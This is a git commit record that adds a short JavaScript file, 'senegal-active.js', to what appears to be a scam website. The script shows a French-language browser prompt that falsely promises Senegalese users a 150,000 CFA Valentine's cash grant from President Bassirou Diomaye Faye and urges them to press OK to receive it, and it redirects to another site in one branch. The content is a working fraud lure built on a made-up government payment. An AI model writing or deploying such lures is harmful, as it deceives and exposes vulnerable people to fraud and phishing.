8026b840e77a22942f316088e60519dd9cfb774e
Sweetblogboi <nsiboy760@gmail.com>
2025-02-11 21:46:45 +0100

    Create senegal-active.js

---
+++ senegal-active.js
@@ -0,0 +1,6 @@
+
+var password = 'APPLIQUER'
+password=prompt('SMS: Félicitations Vous êtes admissible à la SUBVENTION EN ESPÈCES DU PRÉSIDENT BASSIROU DIOMAYE FAYE DE 150 000 CFA POUR LA SAINT-VALENTIN POUR LES SÉNÉGALAIS, Veuillez appuyer sur OK pour recevoir votre cadeau maintenant   ','APPLIQUER');
+if (password != 'APPLIQUER') {
+location.href='https://fast-wayprogram.org/uganda-val.html';
+}
